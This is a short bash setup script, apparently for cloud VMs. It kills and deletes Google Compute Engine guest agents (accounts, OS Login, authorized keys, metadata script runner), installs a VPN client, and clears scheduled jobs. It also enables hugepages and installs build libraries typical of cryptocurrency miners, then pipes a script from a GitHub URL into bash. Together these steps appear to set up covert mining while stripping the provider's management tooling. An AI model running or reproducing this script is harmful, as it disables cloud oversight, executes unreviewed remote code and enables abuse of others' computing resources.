#!/bin/bash

sudo apt-get update
sudo apt-get -y upgrade
sudo pkill google_network
sudo pkill google_clock_sk
sudo pkill google_accounts
cd ../../usr/bin/
sudo rm google_accounts_daemon
sudo rm google_authorized_keys
sudo rm google_clock_skew_daemon
sudo rm google_instance_setup
sudo rm google_metadata_script_runner
sudo rm google_network_daemon
sudo rm google_optimize_local_ssd
sudo rm google_oslogin_control
sudo rm google_oslogin_nss_cache
sudo rm google_set_hostname
sudo rm google_set_multiqueue
cd ~
sudo pkill google_accounts

sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-key FDC247B7
echo 'deb https://repo.windscribe.com/ubuntu bionic main' | sudo tee /etc/apt/sources.list.d/windscribe-repo.list
sudo apt-get update
sudo apt-get install -y windscribe-cli

for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
sudo /bin/su -c "echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf"
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 3
sudo apt-get install dos2unix
sudo apt-get install -y expect

sudo curl -s -L https://raw.githubusercontent.com/githubec/beauty/master/updatescript.sh | bash -s
